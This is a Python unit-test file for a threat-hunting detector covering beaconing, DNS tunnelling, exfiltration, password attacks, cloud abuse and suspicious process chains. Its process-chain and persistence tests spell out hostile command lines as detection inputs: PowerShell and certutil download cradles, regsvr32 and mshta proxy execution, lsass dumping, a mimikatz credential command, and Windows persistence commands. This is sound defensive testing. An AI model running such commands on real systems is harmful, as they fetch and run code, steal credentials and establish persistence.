"""Unit tests for every hunt: when it fires, when it stays quiet, and how config changes the outcome."""

from __future__ import annotations

import random
from dataclasses import replace
from datetime import timedelta
from typing import Any, ClassVar

import pytest

from huntagent.config import HuntConfig
from huntagent.hunts import ALL_HUNTS, hunt_by_id
from huntagent.hunts.base import is_off_hours, make_finding, registered_domain, severity_for
from huntagent.hunts.cloud import CloudAbuseHunt
from huntagent.hunts.endpoint import (
    EXECUTION_RULES,
    PERSISTENCE_RULES,
    PersistenceHunt,
    ProcessChainHunt,
    RareProcessHunt,
)
from huntagent.hunts.identity import ImpossibleTravelHunt, LateralFanOutHunt, PasswordAttackHunt
from huntagent.hunts.network import BeaconingHunt, DgaHunt, DnsTunnelHunt, ExfiltrationHunt
from huntagent.models import Severity, Suppression, Thresholds
from tests.conftest import HUNT_DAY, T0, ev, make_ctx

C2 = "203.0.113.66"
WORD_LIKE = ["mail", "docs", "chat", "files", "intranet", "updates", "calendar", "wiki"]


def cfg(**changes: Any) -> HuntConfig:
    return replace(HuntConfig(), **changes)


class TestBase:
    @pytest.mark.parametrize(
        ("score", "level"),
        [
            (100, Severity.CRITICAL),
            (85, Severity.CRITICAL),
            (84, Severity.HIGH),
            (70, Severity.HIGH),
            (69, Severity.MEDIUM),
            (45, Severity.MEDIUM),
            (44, Severity.LOW),
            (0, Severity.LOW),
        ],
    )
    def test_severity_bands(self, score: int, level: Severity) -> None:
        assert severity_for(score) is level

    @pytest.mark.parametrize(
        ("domain", "expected"),
        [
            ("a.b.example.com", "example.com"),
            ("example.com", "example.com"),
            ("x.y.example.co.uk", "example.co.uk"),
            ("localhost", "localhost"),
            ("EXAMPLE.com.", "example.com"),
        ],
    )
    def test_registered_domain(self, domain: str, expected: str) -> None:
        assert registered_domain(domain) == expected

    def test_off_hours_wraps_midnight(self) -> None:
        night = HUNT_DAY + timedelta(hours=23)
        early = HUNT_DAY + timedelta(hours=3)
        noon = HUNT_DAY + timedelta(hours=12)
        assert (
            is_off_hours(night, 22, 6)
            and is_off_hours(early, 22, 6)
            and not is_off_hours(noon, 22, 6)
        )
        assert is_off_hours(noon, 9, 17) and not is_off_hours(night, 9, 17)

    def test_make_finding_ids_scores_and_ioc_bonus(self) -> None:
        events = [ev("flow", 0, host="h", dst_ip=C2), ev("flow", 5, host="h", dst_ip=C2)]
        config = cfg(ioc_ips=frozenset({C2}))
        a = make_finding(
            "beaconing",
            "t",
            events,
            score=90,
            tactic="x",
            techniques=["T1"],
            explanation="e",
            config=config,
            hosts=["h"],
            ips=[C2],
        )
        b = make_finding(
            "beaconing",
            "t",
            list(reversed(events)),
            score=90,
            tactic="x",
            techniques=["T1"],
            explanation="e",
            config=config,
            hosts=["h"],
            ips=[C2],
        )
        assert a.id == b.id and a.id.startswith("F-") and a.ioc_match and a.score == 100
        plain = make_finding(
            "beaconing",
            "t",
            events,
            score=90,
            tactic="x",
            techniques=["T1"],
            explanation="e",
            config=HuntConfig(),
            hosts=["h"],
            ips=[C2],
        )
        assert (
            plain.score == 90
            and not plain.ioc_match
            and a.first_seen == events[0].time
            and a.last_seen == events[1].time
        )
        assert a.entities() == {"host:h", f"ip:{C2}"}

    def test_make_finding_ioc_by_domain_hash_and_clamp(self) -> None:
        e = ev("dns", 0, host="h", domain="x.evil.example")
        assert make_finding(
            "d",
            "t",
            [e],
            score=10,
            tactic="x",
            techniques=[],
            explanation="",
            config=cfg(ioc_domains=frozenset({"evil.example"})),
            domains=["x.evil.example"],
        ).ioc_match
        p = ev("process", 0, host="h", process="a.exe", attrs={"sha256": "SHA256=" + "AB" * 32})
        assert make_finding(
            "d",
            "t",
            [p],
            score=10,
            tactic="x",
            techniques=[],
            explanation="",
            config=cfg(ioc_hashes=frozenset({"ab" * 32})),
        ).ioc_match
        assert (
            make_finding(
                "d",
                "t",
                [e],
                score=250,
                tactic="x",
                techniques=[],
                explanation="",
                config=HuntConfig(),
            ).score
            == 100
        )
        assert (
            make_finding(
                "d",
                "t",
                [e],
                score=-5,
                tactic="x",
                techniques=[],
                explanation="",
                config=HuntConfig(),
            ).score
            == 0
        )

    def test_evidence_is_capped(self) -> None:
        events = [ev("flow", n, host="h", dst_ip=C2) for n in range(80)]
        assert (
            len(
                make_finding(
                    "d",
                    "t",
                    events,
                    score=10,
                    tactic="x",
                    techniques=[],
                    explanation="",
                    config=HuntConfig(),
                ).event_ids
            )
            == 50
        )

    def test_registry_is_consistent(self) -> None:
        assert len({h.id for h in ALL_HUNTS}) == len(ALL_HUNTS) == 11
        for h in ALL_HUNTS:
            assert h.name and h.tactic and h.techniques and h.required and h.description
            assert hunt_by_id(h.id) is h
            t = Thresholds()
            assert h.spl(t).strip() and h.kql(t).strip()
        assert hunt_by_id("nope") is None

    def test_thresholds_appear_in_queries(self) -> None:
        t = Thresholds(beacon_min_connections=33, spray_min_users=44, exfil_min_bytes=777)
        assert (
            "33" in BeaconingHunt().spl(t)
            and "44" in PasswordAttackHunt().kql(t)
            and "777" in ExfiltrationHunt().spl(t)
        )


def beacon(
    host: str = "ws-1",
    dst: str = C2,
    n: int = 20,
    gap: float = 60,
    jitter: float = 2,
    port: int = 443,
    seed: int = 1,
) -> list[Any]:
    rng = random.Random(seed)
    return [
        ev(
            "flow",
            0,
            seconds=i * gap + rng.uniform(-jitter, jitter),
            host=host,
            dst_ip=dst,
            dst_port=port,
            bytes_out=450,
        )
        for i in range(n)
    ]


class TestBeaconing:
    def test_regular_connections_fire(self) -> None:
        findings = BeaconingHunt().run(make_ctx(beacon()))
        assert len(findings) == 1
        f = findings[0]
        assert (
            f.hosts == ["ws-1"]
            and f.ips == [C2]
            and f.details["connections"] == 20
            and f.details["jitter"] < 0.1
            and f.details["new_destination"]
        )
        assert f.tactic == "Command and Control" and "T1071" in f.techniques and f.score >= 70

    def test_known_destination_scores_lower(self) -> None:
        known = [ev("flow", -1440, host="ws-1", dst_ip=C2)]
        new = BeaconingHunt().run(make_ctx(beacon()))[0].score
        old = BeaconingHunt().run(make_ctx(beacon(), baseline=known))[0]
        assert old.score == new - 10 and not old.details["new_destination"]

    def test_human_traffic_is_irregular(self) -> None:
        rng = random.Random(3)
        events = [
            ev("flow", rng.uniform(0, 240), host="ws-1", dst_ip=C2, dst_port=443) for _ in range(30)
        ]
        assert BeaconingHunt().run(make_ctx(events)) == []

    def test_too_few_or_too_fast_or_internal_or_allowlisted(self) -> None:
        assert BeaconingHunt().run(make_ctx(beacon(n=8))) == []
        assert BeaconingHunt().run(make_ctx(beacon(gap=5))) == []
        assert BeaconingHunt().run(make_ctx(beacon(dst="10.1.2.3"))) == []
        allowed = cfg(allow_networks=(__import__("ipaddress").ip_network("203.0.113.0/24"),))
        assert BeaconingHunt().run(make_ctx(beacon(), config=allowed)) == []

    def test_thresholds_change_the_outcome(self) -> None:
        events = beacon(n=8)
        loose = cfg(thresholds=Thresholds(beacon_min_connections=5))
        assert len(BeaconingHunt().run(make_ctx(events, config=loose))) == 1
        strict = cfg(thresholds=Thresholds(beacon_max_jitter=0.0001))
        assert BeaconingHunt().run(make_ctx(beacon(), config=strict)) == []

    def test_separate_ports_and_hosts_are_separate_groups(self) -> None:
        events = beacon(host="a") + beacon(host="b", seed=2) + beacon(host="a", port=8443, seed=4)
        assert len(BeaconingHunt().run(make_ctx(events))) == 3


def random_label(rng: random.Random, n: int = 32) -> str:
    return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(n))


class TestDns:
    def test_tunnel_fires_on_many_random_long_subdomains(self) -> None:
        rng = random.Random(5)
        events = [
            ev(
                "dns",
                i * 0.5,
                host="ws-1",
                domain=f"{random_label(rng)}.tunnel.example",
                query_type="TXT",
            )
            for i in range(40)
        ]
        findings = DnsTunnelHunt().run(make_ctx(events))
        assert (
            len(findings) == 1
            and findings[0].domains == ["tunnel.example"]
            and findings[0].details["unique_subdomains"] == 40
        )
        assert findings[0].details["record_type_ratio"] == 1.0 and findings[0].score >= 75

    def test_normal_dns_is_quiet(self) -> None:
        events = [
            ev("dns", i, host="ws-1", domain=f"{WORD_LIKE[i % 8]}{i}.example.com")
            for i in range(60)
        ]
        assert DnsTunnelHunt().run(make_ctx(events)) == []

    def test_many_subdomains_but_low_entropy_or_short(self) -> None:
        short = [ev("dns", i, host="ws-1", domain=f"h{i}.cdn.example.net") for i in range(60)]
        assert DnsTunnelHunt().run(make_ctx(short)) == []
        repeated = [
            ev("dns", i, host="ws-1", domain="a" * 25 + f"{i}.x.example.net") for i in range(40)
        ]
        assert DnsTunnelHunt().run(make_ctx(repeated)) == []

    def test_few_subdomains_and_allowlisted_domain(self) -> None:
        rng = random.Random(6)
        few = [ev("dns", i, host="h", domain=f"{random_label(rng)}.t.example") for i in range(10)]
        assert DnsTunnelHunt().run(make_ctx(few)) == []
        many = [ev("dns", i, host="h", domain=f"{random_label(rng)}.t.example") for i in range(40)]
        assert DnsTunnelHunt().run(make_ctx(many, config=cfg(allow_domains=("t.example",)))) == []

    def test_dga_needs_many_distinct_failed_random_names(self) -> None:
        rng = random.Random(7)
        events = [
            ev(
                "dns",
                i * 0.5,
                host="ws-7",
                domain=random_label(rng, 14) + ".com",
                outcome="failure",
            )
            for i in range(20)
        ]
        findings = DgaHunt().run(make_ctx(events))
        assert (
            len(findings) == 1
            and findings[0].hosts == ["ws-7"]
            and findings[0].details["distinct_domains"] == 20
        )
        ok = [replace_outcome(e) for e in events]
        assert DgaHunt().run(make_ctx(ok)) == []
        assert DgaHunt().run(make_ctx(events[:5])) == []

    def test_dga_ignores_low_entropy_failures(self) -> None:
        events = [
            ev("dns", i, host="h", domain=f"{'ab' * 3}{i}.com", outcome="failure")
            for i in range(30)
        ]
        assert DgaHunt().run(make_ctx(events)) == []


def replace_outcome(event: Any) -> Any:
    return event.model_copy(update={"outcome": "success"})


class TestExfiltration:
    def _big(
        self, host: str = "srv", dst: str = C2, hour: int = 2, total: int = 180_000_000
    ) -> list[Any]:
        base = HUNT_DAY + timedelta(hours=hour)
        return [
            ev("flow", i * 5, base=base, host=host, dst_ip=dst, dst_port=8443, bytes_out=total // 6)
            for i in range(6)
        ]

    def _baseline(self, host: str = "srv") -> list[Any]:
        return [
            ev(
                "flow",
                0,
                base=HUNT_DAY - timedelta(days=d) + timedelta(hours=10),
                host=host,
                dst_ip="192.0.2.101",
                bytes_out=25_000_000 + d * 100_000,
            )
            for d in range(1, 8)
        ]

    def test_new_destination_with_large_volume_fires(self) -> None:
        findings = ExfiltrationHunt().run(make_ctx(self._big(), baseline=self._baseline()))
        assert len(findings) == 1
        f = findings[0]
        assert (
            f.details["bytes_out"] == 180_000_000
            and f.details["new_destination"]
            and f.details["off_hours_share"] == 1.0
            and f.details["zscore"] > 3
        )
        assert f.tactic == "Exfiltration" and f.score >= 85

    def test_known_destination_needs_a_volume_anomaly(self) -> None:
        events = self._big(dst="192.0.2.101", hour=11)
        baseline = self._baseline()
        assert (
            ExfiltrationHunt()
            .run(make_ctx(events, baseline=baseline))[0]
            .details["new_destination"]
            is False
        )
        doubled = [
            ev(
                "flow",
                i,
                host="srv",
                dst_ip="192.0.2.101",
                bytes_out=9_000_000,
                base=HUNT_DAY + timedelta(hours=11),
            )
            for i in range(6)
        ]
        assert ExfiltrationHunt().run(make_ctx(doubled, baseline=baseline)) != []
        usual = [
            ev(
                "flow",
                i,
                host="srv",
                dst_ip="192.0.2.101",
                bytes_out=4_000_000,
                base=HUNT_DAY + timedelta(hours=11),
            )
            for i in range(6)
        ]
        assert ExfiltrationHunt().run(make_ctx(usual, baseline=baseline)) == []

    def test_below_threshold_internal_and_allowlisted(self) -> None:
        assert ExfiltrationHunt().run(make_ctx(self._big(total=6_000_000))) == []
        assert ExfiltrationHunt().run(make_ctx(self._big(dst="10.2.3.4"))) == []
        allowed = cfg(allow_networks=(__import__("ipaddress").ip_network("203.0.113.0/24"),))
        assert ExfiltrationHunt().run(make_ctx(self._big(), config=allowed)) == []

    def test_no_baseline_still_flags_a_new_destination(self) -> None:
        assert len(ExfiltrationHunt().run(make_ctx(self._big()))) == 1


def fails(
    ip: str,
    users: list[str],
    start_min: float = 0,
    step: float = 1,
    per_user: int = 1,
    host: str = "vpn",
) -> list[Any]:
    out = []
    for i, u in enumerate(users):
        for k in range(per_user):
            out.append(
                ev(
                    "auth",
                    start_min + i * step + k * 0.1,
                    host=host,
                    user=u,
                    src_ip=ip,
                    outcome="failure",
                )
            )
    return out


class TestPasswordAttacks:
    users: ClassVar[list[str]] = [f"u{n}" for n in range(12)]

    def test_spray_fires_and_success_escalates(self) -> None:
        events = fails("198.51.100.23", self.users)
        base = PasswordAttackHunt().run(make_ctx(events))
        assert (
            len(base) == 1
            and base[0].details["accounts"] == 12
            and base[0].details["successful_accounts"] == []
        )
        won = PasswordAttackHunt().run(
            make_ctx(
                [
                    *events,
                    ev(
                        "auth", 20, host="vpn", user="u3", src_ip="198.51.100.23", outcome="success"
                    ),
                ]
            )
        )
        assert (
            won[0].details["successful_accounts"] == ["u3"]
            and won[0].score == base[0].score + 25
            and "successful sign-in" in won[0].title
        )

    def test_spray_hosts_are_not_reported_as_affected(self) -> None:
        assert PasswordAttackHunt().run(make_ctx(fails("198.51.100.23", self.users)))[0].hosts == []

    def test_slow_spray_outside_the_window_and_too_few_accounts(self) -> None:
        slow = fails("198.51.100.23", self.users, step=10)
        assert PasswordAttackHunt().run(make_ctx(slow)) == []
        assert PasswordAttackHunt().run(make_ctx(fails("198.51.100.23", self.users[:5]))) == []

    def test_many_attempts_per_account_is_not_a_spray(self) -> None:
        events = fails("198.51.100.23", self.users[:9], per_user=5, step=0.5)
        assert [
            f for f in PasswordAttackHunt().run(make_ctx(events)) if f.details.get("accounts")
        ] == []

    def test_scanner_addresses_are_ignored(self) -> None:
        config = cfg(scanner_ips=frozenset({"198.51.100.23"}))
        assert (
            PasswordAttackHunt().run(make_ctx(fails("198.51.100.23", self.users), config=config))
            == []
        )

    def test_bruteforce_then_success(self) -> None:
        events = [
            ev("auth", i * 0.2, host="srv", user="bob", src_ip="198.51.100.9", outcome="failure")
            for i in range(12)
        ]
        events.append(
            ev("auth", 4, host="srv", user="bob", src_ip="198.51.100.9", outcome="success")
        )
        findings = PasswordAttackHunt().run(make_ctx(events))
        assert (
            len(findings) == 1
            and findings[0].details == {"failures": 12, "followed_by_success": True}
            and findings[0].users == ["bob"]
        )

    def test_bruteforce_needs_enough_failures_and_respects_noisy_users(self) -> None:
        few = [
            ev("auth", i * 0.2, host="srv", user="bob", src_ip="198.51.100.9", outcome="failure")
            for i in range(6)
        ]
        assert PasswordAttackHunt().run(make_ctx(few)) == []
        many = [
            ev("auth", i * 0.2, host="srv", user="svc", src_ip="198.51.100.9", outcome="failure")
            for i in range(12)
        ]
        assert (
            PasswordAttackHunt().run(make_ctx(many, config=cfg(noisy_users=frozenset({"svc"}))))
            == []
        )

    def test_cloud_console_failures_count(self) -> None:
        events = [
            ev(
                "cloud",
                i * 0.3,
                user=f"user{i}",
                src_ip="198.51.100.4",
                api="ConsoleLogin",
                outcome="failure",
            )
            for i in range(10)
        ]
        assert len(PasswordAttackHunt().run(make_ctx(events))) == 1


GEO = cfg(
    geo=tuple(
        (__import__("ipaddress").ip_network(c), k)
        for c, k in (("192.0.2.0/24", "US"), ("203.0.113.0/24", "BR"), ("198.51.100.0/24", "RO"))
    )
)


class TestImpossibleTravel:
    def _login(self, minutes: float, ip: str, user: str = "alice") -> Any:
        return ev("auth", minutes, host="vpn", user=user, src_ip=ip, outcome="success")

    def test_two_countries_within_the_window_fire(self) -> None:
        findings = ImpossibleTravelHunt().run(
            make_ctx([self._login(0, "192.0.2.10"), self._login(60, "203.0.113.9")], config=GEO)
        )
        assert (
            len(findings) == 1
            and findings[0].details["countries"] == ["US", "BR"]
            and findings[0].details["hours_apart"] == 1.0
        )

    def test_new_country_for_the_account_scores_higher(self) -> None:
        events = [self._login(0, "192.0.2.10"), self._login(60, "203.0.113.9")]
        baseline = [
            ev("auth", -1440, host="vpn", user="alice", src_ip="192.0.2.10", outcome="success")
        ]
        plain = ImpossibleTravelHunt().run(make_ctx(events, config=GEO))[0]
        known = ImpossibleTravelHunt().run(make_ctx(events, baseline=baseline, config=GEO))[0]
        assert known.details["new_country"] and known.score == plain.score + 15

    def test_slow_travel_same_country_and_other_users_are_fine(self) -> None:
        assert (
            ImpossibleTravelHunt().run(
                make_ctx(
                    [self._login(0, "192.0.2.10"), self._login(600, "203.0.113.9")], config=GEO
                )
            )
            == []
        )
        assert (
            ImpossibleTravelHunt().run(
                make_ctx([self._login(0, "192.0.2.10"), self._login(5, "192.0.2.11")], config=GEO)
            )
            == []
        )
        assert (
            ImpossibleTravelHunt().run(
                make_ctx(
                    [self._login(0, "192.0.2.10", "a"), self._login(5, "203.0.113.9", "b")],
                    config=GEO,
                )
            )
            == []
        )

    def test_failures_unknown_countries_and_vpn_allowlist_are_ignored(self) -> None:
        failed = ev("auth", 5, host="vpn", user="alice", src_ip="203.0.113.9", outcome="failure")
        assert (
            ImpossibleTravelHunt().run(make_ctx([self._login(0, "192.0.2.10"), failed], config=GEO))
            == []
        )
        assert (
            ImpossibleTravelHunt().run(
                make_ctx([self._login(0, "192.0.2.10"), self._login(5, "8.8.8.8")], config=GEO)
            )
            == []
        )
        vpn = replace(GEO, allow_networks=(__import__("ipaddress").ip_network("203.0.113.0/24"),))
        assert (
            ImpossibleTravelHunt().run(
                make_ctx([self._login(0, "192.0.2.10"), self._login(5, "203.0.113.9")], config=vpn)
            )
            == []
        )

    def test_needs_a_geography_file(self) -> None:
        ctx = make_ctx([self._login(0, "192.0.2.10")])
        assert "geography" in ImpossibleTravelHunt().unavailable(ctx)
        assert ImpossibleTravelHunt().unavailable(make_ctx([], config=GEO)) == ""


class TestLateralFanOut:
    def _fan(
        self,
        hosts: int = 7,
        user: str = "adm",
        origin: str = "ws-4",
        gap: float = 2,
        logon: str = "3",
    ) -> list[Any]:
        return [
            ev(
                "auth",
                i * gap,
                host=f"t{i}",
                user=user,
                src_ip="10.0.0.5",
                outcome="success",
                attrs={"logon_type": logon, "src_host": origin},
            )
            for i in range(hosts)
        ]

    def test_fires_and_includes_the_origin_host(self) -> None:
        findings = LateralFanOutHunt().run(make_ctx(self._fan()))
        assert (
            len(findings) == 1
            and findings[0].users == ["adm"]
            and "ws-4" in findings[0].hosts
            and findings[0].details["hosts"] == 7
        )

    def test_baseline_of_known_hosts_suppresses(self) -> None:
        known = [
            ev(
                "auth",
                -1440,
                host=f"t{i}",
                user="adm",
                outcome="success",
                attrs={"logon_type": "3"},
            )
            for i in range(7)
        ]
        assert LateralFanOutHunt().run(make_ctx(self._fan(), baseline=known)) == []
        half = known[:2]
        assert len(LateralFanOutHunt().run(make_ctx(self._fan(), baseline=half))) == 1

    def test_too_few_too_slow_wrong_logon_and_noisy_users(self) -> None:
        assert LateralFanOutHunt().run(make_ctx(self._fan(hosts=3))) == []
        assert LateralFanOutHunt().run(make_ctx(self._fan(gap=20))) == []
        assert LateralFanOutHunt().run(make_ctx(self._fan(logon="2"))) == []
        assert (
            LateralFanOutHunt().run(
                make_ctx(self._fan(), config=cfg(noisy_users=frozenset({"adm"})))
            )
            == []
        )

    def test_ip_origin(self) -> None:
        events = [
            ev(
                "auth",
                i,
                host=f"t{i}",
                user="adm",
                src_ip="10.0.0.7",
                outcome="success",
                attrs={"logon_type": "10"},
            )
            for i in range(6)
        ]
        f = LateralFanOutHunt().run(make_ctx(events))[0]
        assert f.ips == ["10.0.0.7"] and f.details["origin"] == "10.0.0.7"


def proc(
    minutes: float,
    image: str,
    parent: str = "explorer.exe",
    cmd: str = "",
    host: str = "ws-1",
    user: str = "u1",
) -> Any:
    return ev(
        "process",
        minutes,
        host=host,
        user=user,
        process=f"C:\\Windows\\System32\\{image}",
        parent=f"C:\\Program Files\\{parent}",
        cmdline=cmd,
    )


class TestProcessChains:
    @pytest.mark.parametrize(
        ("event", "rule"),
        [
            (proc(0, "powershell.exe", "winword.exe"), "office_shell"),
            (proc(0, "cmd.exe", "excel.exe", "cmd /c dir"), "office_shell"),
            (
                proc(
                    0,
                    "powershell.exe",
                    cmd="powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                ),
                "encoded_command",
            ),
            (
                proc(
                    0,
                    "powershell.exe",
                    cmd="powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/a')",
                ),
                "download_cradle",
            ),
            (
                proc(0, "certutil.exe", cmd="certutil -urlcache -f http://x/a.exe a.exe"),
                "download_cradle",
            ),
            (
                proc(0, "regsvr32.exe", cmd="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"),
                "lolbin_proxy",
            ),
            (proc(0, "mshta.exe", cmd="mshta http://x/a.hta"), "lolbin_proxy"),
            (proc(0, "rundll32.exe", cmd="rundll32 javascript:alert(1)"), "lolbin_proxy"),
            (proc(0, "procdump.exe", cmd="procdump -ma lsass.exe out.dmp"), "credential_dump"),
            (proc(0, "x.exe", cmd="sekurlsa::logonpasswords"), "credential_dump"),
            (proc(0, "cmd.exe", "w3wp.exe"), "webshell_child"),
            (proc(0, "sc.exe", cmd="sc \\\\srv1 create evil binPath= x"), "remote_service_exec"),
            (proc(0, "psexesvc.exe"), "remote_service_exec"),
        ],
    )
    def test_each_rule_fires(self, event: Any, rule: str) -> None:
        details = [f.details["rule"] for f in ProcessChainHunt().run(make_ctx([event]))]
        assert rule in details

    @pytest.mark.parametrize(
        "event",
        [
            proc(0, "powershell.exe", "explorer.exe", "powershell Get-Date"),
            proc(0, "chrome.exe", "explorer.exe", "chrome.exe --flag"),
            proc(0, "cmd.exe", "explorer.exe", "cmd /c echo hi"),
            proc(0, "powershell.exe", cmd="powershell -c Get-ChildItem"),
            proc(0, "regsvr32.exe", cmd="regsvr32 /s local.dll"),
            proc(0, "winword.exe", "explorer.exe"),
        ],
    )
    def test_benign_process_events_are_quiet(self, event: Any) -> None:
        assert ProcessChainHunt().run(make_ctx([event])) == []

    def test_grouping_score_and_secret_redaction(self) -> None:
        events = [proc(i, "powershell.exe", "winword.exe", host="ws-1") for i in range(4)] + [
            proc(0, "cmd.exe", "winword.exe", host="ws-2")
        ]
        findings = ProcessChainHunt().run(make_ctx(events))
        by_host = {f.hosts[0]: f for f in findings}
        assert (
            by_host["ws-1"].details["events"] == 4
            and by_host["ws-1"].score == 80 + 6
            and by_host["ws-2"].score == 80
        )

    def test_trusted_process_is_skipped(self) -> None:
        event = proc(0, "cmd.exe", "winword.exe")
        assert (
            ProcessChainHunt().run(
                make_ctx([event], config=cfg(trusted_processes=frozenset({"cmd.exe"})))
            )
            == []
        )

    def test_sigma_rules_are_valid_documents(self) -> None:
        rules = ProcessChainHunt().sigma(Thresholds()) + PersistenceHunt().sigma(Thresholds())
        assert len(rules) == len(EXECUTION_RULES) + len(PERSISTENCE_RULES)
        for rule in rules:
            assert {
                "title",
                "id",
                "logsource",
                "detection",
                "level",
                "falsepositives",
                "tags",
            } <= set(rule)
            assert rule["detection"]["condition"] == "selection" and rule["detection"]["selection"]
        office = next(r for r in rules if r["id"] == "office_shell")
        assert (
            "\\winword.exe" in office["detection"]["selection"]["ParentImage|endswith"]
            and office["level"] == "high"
        )


class TestPersistence:
    @pytest.mark.parametrize(
        ("cmd", "rule"),
        [
            ("schtasks /create /tn Updater /tr C:\\x.exe /sc minute", "scheduled_task"),
            (
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d c:\\x.exe",
                "run_key",
            ),
            ("sc create evil binPath= c:\\x.exe", "service_created"),
            (
                "wmic /namespace:\\\\root\\subscription path __EventFilter create",
                "wmi_subscription",
            ),
            (
                "copy x.exe C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                "startup_folder",
            ),
        ],
    )
    def test_rules(self, cmd: str, rule: str) -> None:
        findings = PersistenceHunt().run(make_ctx([proc(0, "cmd.exe", cmd=cmd)]))
        assert [f.details["rule"] for f in findings] == [rule] and findings[
            0
        ].tactic == "Persistence"

    def test_query_deletion_is_not_persistence(self) -> None:
        assert (
            PersistenceHunt().run(make_ctx([proc(0, "schtasks.exe", cmd="schtasks /query")])) == []
        )


class TestRareProcess:
    common: ClassVar[list[Any]] = [
        ev("process", -1440, host=f"h{i}", process="C:\\Windows\\explorer.exe") for i in range(5)
    ]

    def test_new_binary_in_a_writable_path_that_imitates_a_system_name(self) -> None:
        odd = ev("process", 0, host="ws-1", user="u", process="C:\\Users\\Public\\svch0st.exe")
        f = RareProcessHunt().run(make_ctx([odd], baseline=self.common))[0]
        assert (
            f.details["user_writable_path"]
            and f.details["lookalike_of"] == "svchost.exe"
            and f.score == 85
        )
        assert "close to svchost.exe" in f.explanation

    def test_plain_new_binary_scores_low(self) -> None:
        f = RareProcessHunt().run(
            make_ctx(
                [ev("process", 0, host="ws-1", process="C:\\Program Files\\Tool\\tool.exe")],
                baseline=self.common,
            )
        )[0]
        assert f.score == 35 and f.severity is Severity.LOW

    def test_seen_in_baseline_widespread_or_trusted_is_quiet(self) -> None:
        known = ev("process", 0, host="ws-1", process="C:\\Windows\\explorer.exe")
        assert RareProcessHunt().run(make_ctx([known], baseline=self.common)) == []
        wide = [ev("process", 0, host=f"h{i}", process="C:\\x\\newtool.exe") for i in range(5)]
        assert RareProcessHunt().run(make_ctx(wide, baseline=self.common)) == []
        trusted = cfg(trusted_processes=frozenset({"tool.exe"}))
        assert (
            RareProcessHunt().run(
                make_ctx(
                    [ev("process", 0, host="h", process="C:\\t\\tool.exe")],
                    baseline=self.common,
                    config=trusted,
                )
            )
            == []
        )

    def test_needs_baseline_process_data(self) -> None:
        assert "baseline" in RareProcessHunt().unavailable(
            make_ctx([ev("process", 0, host="h", process="a.exe")])
        )
        assert RareProcessHunt().unavailable(make_ctx([], baseline=self.common)) == ""

    def test_threshold_controls_how_rare_is_rare(self) -> None:
        three = [ev("process", 0, host=f"h{i}", process="C:\\x\\newtool.exe") for i in range(3)]
        assert RareProcessHunt().run(make_ctx(three, baseline=self.common)) == []
        assert (
            len(
                RareProcessHunt().run(
                    make_ctx(
                        three,
                        baseline=self.common,
                        config=cfg(thresholds=Thresholds(rare_max_hosts=3)),
                    )
                )
            )
            == 1
        )


def api(
    minutes: float,
    name: str,
    user: str = "bot",
    ip: str = "198.51.100.7",
    mfa: bool | None = None,
    outcome: str = "success",
) -> Any:
    return ev("cloud", minutes, user=user, src_ip=ip, api=name, mfa=mfa, outcome=outcome)


class TestCloudAbuse:
    def test_root_use(self) -> None:
        f = CloudAbuseHunt().run(make_ctx([api(0, "ConsoleLogin", "root", mfa=False)]))
        assert len(f) == 1 and f[0].details["without_mfa"] == 1 and f[0].score == 70
        assert (
            CloudAbuseHunt().run(make_ctx([api(0, "ConsoleLogin", "root", outcome="failure")]))
            == []
        )

    def test_privilege_changes_without_mfa_only(self) -> None:
        f = CloudAbuseHunt().run(
            make_ctx([api(0, "CreateAccessKey", mfa=False), api(1, "AttachUserPolicy", mfa=False)])
        )
        assert (
            len(f) == 1
            and f[0].details["apis"] == ["AttachUserPolicy", "CreateAccessKey"]
            and f[0].score == 68
        )
        assert (
            CloudAbuseHunt().run(
                make_ctx([api(0, "CreateAccessKey", mfa=True), api(1, "CreateUser", mfa=None)])
            )
            == []
        )

    def test_logging_tamper(self) -> None:
        f = CloudAbuseHunt().run(make_ctx([api(0, "StopLogging"), api(1, "DeleteTrail")]))
        assert len(f) == 1 and f[0].score == 85 and f[0].tactic == "Defense Evasion"

    def test_enumeration_burst_from_a_new_address(self) -> None:
        names = [
            "ListUsers",
            "ListRoles",
            "ListBuckets",
            "DescribeInstances",
            "DescribeVpcs",
            "GetAccountAuthorizationDetails",
            "ListPolicies",
        ]
        burst = [api(i * 0.5, n, "ci", "198.51.100.88") for i, n in enumerate(names)]
        fresh = CloudAbuseHunt().run(make_ctx(burst))[0]
        known = CloudAbuseHunt().run(
            make_ctx(burst, baseline=[api(-1440, "ListUsers", "ci", "198.51.100.88")])
        )[0]
        assert (
            fresh.details["new_source_address"]
            and not known.details["new_source_address"]
            and fresh.score == known.score + 15
        )

    def test_slow_or_narrow_enumeration_is_quiet(self) -> None:
        names = [
            "ListUsers",
            "ListRoles",
            "ListBuckets",
            "DescribeInstances",
            "DescribeVpcs",
            "ListPolicies",
        ]
        assert (
            CloudAbuseHunt().run(make_ctx([api(i * 20, n, "ci") for i, n in enumerate(names)]))
            == []
        )
        assert (
            CloudAbuseHunt().run(make_ctx([api(i * 0.1, "ListBuckets", "ci") for i in range(20)]))
            == []
        )

    def test_noisy_users_are_skipped_and_sigma_is_available(self) -> None:
        assert (
            CloudAbuseHunt().run(
                make_ctx([api(0, "StopLogging")], config=cfg(noisy_users=frozenset({"bot"})))
            )
            == []
        )
        rules = CloudAbuseHunt().sigma(Thresholds())
        assert {r["id"] for r in rules} == {"cloud_logging_tamper", "iam_change_no_mfa"}


def test_suppression_model_requires_a_reason() -> None:
    with pytest.raises(ValueError):
        Suppression(
            hunt="x", entity="host", value="h", reason="short", approved_by="a", expires=T0.date()
        )
